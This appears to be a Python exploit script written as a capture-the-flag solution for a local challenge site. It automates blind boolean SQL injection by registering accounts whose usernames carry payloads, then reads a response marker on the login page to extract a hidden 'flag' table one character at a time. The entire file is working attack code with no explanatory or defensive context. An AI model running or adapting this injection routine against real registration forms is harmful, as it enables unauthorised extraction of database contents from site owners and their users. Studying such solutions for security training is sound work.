#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/05/28, 15:26
"""

import requests as req
import random
import sys
import time

URL = 'http://web20183.local.virzz.com'


def login(email):
    data = {
        "email": email,
        "password": "123456"
    }
    res = req.post(URL + '/login.php', data)
    if res.status_code == 200 and b'1          </span>' in res.content:
        return True
    return False


def reg(u, e):
    data = {
        "username": u,
        "email": e,
        "password": "123456"
    }
    res = req.post(URL + '/register.php', data, allow_redirects=False)
    if res.status_code == 302:
        print("[+] Register")
        return login(e)
    return False


def b(pl):
    table = 'qwertyuiopasdfghjklzxcvbnm'
    email = ''.join(random.sample(table, 8)) + '@qq.com'
    return reg(pl, email)


def getLen(sql):
    print("[+] Starting getLen...")
    for i in range(1, 60):
        print("[+] Len : -> %d <-" % i, end='\r')
        if b("1'and((select length((%s)))=%d)and'1" % (sql, i)):
            print("[+] Len : -> %d <-" % i)
            return i
        time.sleep(0.01)
    return 0


def getData(sql="version()"):
    _len = getLen(sql)
    if not _len:
        print("[-] getLen 'Error'")
        return False
    print("[+] Starting getData...")
    table = '1234567890.{}-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
    res = ''
    for pos in range(1, _len + 1):
        for ch in table:
            print("[+] Result : -> %s%c <-" % (res, ch), end='\r')
            pl = "1'and((select substr((%s)from(%d)for(1))='%s'))and'1" % (
                sql, pos, ch)
            if b(pl):
                res += ch
                break
    print("[+] Result : -> %s <- " % res)
    return res


# right(left(x,pos),1)
# mid(x,pos,1)
if __name__ == '__main__':
    # pl = "(select substr((version())from(1)for(1))='%s')" % '5'
    # pl = "1'and(%s)and'1" % pl
    # print(b(pl))
    pl = 'user()'
    pl = 'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'
    getData(pl)
    # print(b('v'))
